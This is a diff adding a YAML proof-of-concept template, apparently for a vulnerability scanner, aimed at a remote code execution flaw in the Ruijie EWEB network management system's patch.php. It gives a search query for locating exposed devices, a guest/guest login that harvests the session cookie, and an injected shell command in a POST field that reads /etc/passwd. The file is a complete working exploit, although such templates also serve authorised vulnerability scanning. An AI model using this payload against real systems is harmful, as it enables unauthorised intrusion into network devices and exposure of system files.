@@ -1,0 +1,36 @@
+id: poc-yaml-ruijie-eweb-patch-php-rce
+info:
+  name: 锐捷 EWEB patch.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: eweb
+  fofa: title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"
+requests:
+- method: POST
+  path: /ddi/server/login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=guest&password=guest?
+  expression: status_code == 200
+  output:
+  - regex_match(headers,"RUIJIEID=(?P<cookie>.*?);")
+- method: POST
+  path: /patch.php?a=setPatchAutoTime
+  headers:
+    Cookie: RUIJIEID={{.cookie}};user=guest
+    Content-Type: application/x-www-form-urlencoded
+  data: pram=%20'%3bcat%20/etc/passwd%20%23
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin") &&
+
+    contains(headers,"user=guest") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
